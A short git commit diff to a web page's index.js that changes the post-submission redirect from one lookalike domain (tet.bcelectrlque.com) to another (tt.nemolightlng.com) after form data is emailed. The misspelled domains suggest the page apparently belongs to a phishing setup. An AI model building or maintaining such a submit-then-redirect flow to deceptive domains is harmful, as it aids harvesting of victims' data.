84e511bd519eee1aba1564304884c7899f1378fa
husknet <127146284+husknet@users.noreply.github.com>
2025-01-20 17:04:23 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tet.bcelectrlque.com/';
+        window.location.href = 'https://tt.nemolightlng.com/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
